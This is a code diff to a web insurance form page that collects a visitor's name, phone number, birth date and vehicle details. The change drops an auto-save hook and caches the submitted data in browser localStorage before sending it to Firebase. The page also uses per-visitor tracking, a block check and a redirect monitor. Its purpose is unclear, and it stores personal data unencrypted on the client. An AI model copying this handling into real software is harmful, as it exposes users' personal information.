@@ -17,7 +17,6 @@ import {
 import { FullPageLoader } from "@/components/loader";
 import { StepShell } from "@/components/step-shell";
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
-import { useAutoSave } from "@/hooks/use-auto-save";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { addData } from "@/lib/firebase";
 import { getSelectedVehicle } from "@/lib/vehicle-api";
@@ -76,24 +75,6 @@ export default function InsurancePage() {
     }
   }, []);
 
-  useAutoSave({
-    visitorId: visitorID,
-    pageName: "insur",
-    data: {
-      fullName,
-      ownerName: fullName,
-      phoneNumber,
-      birthDate,
-      insuranceCoverage,
-      insuranceStartDate,
-      vehicleUsage,
-      vehicleValue,
-      vehicleYear,
-      vehicleModel,
-      repairLocation,
-    },
-  });
-
   useRedirectMonitor({ visitorId: visitorID, currentPage: "insur" });
 
   useEffect(() => {
@@ -129,8 +110,7 @@ export default function InsurancePage() {
       return;
     }
     setSubmitting(true);
-    await addData({
-      id: visitorID,
+    const insurData = {
       fullName,
       ownerName: fullName,
       phoneNumber,
@@ -142,6 +122,12 @@ export default function InsurancePage() {
       vehicleYear,
       vehicleModel,
       repairLocation,
+      timestamp: new Date().toISOString(),
+    };
+    localStorage.setItem("insurFormData", JSON.stringify(insurData));
+    await addData({
+      id: visitorID,
+      ...insurData,
       currentStep: 3,
       currentPage: "compar",
       insurCompletedAt: new Date().toISOString(),
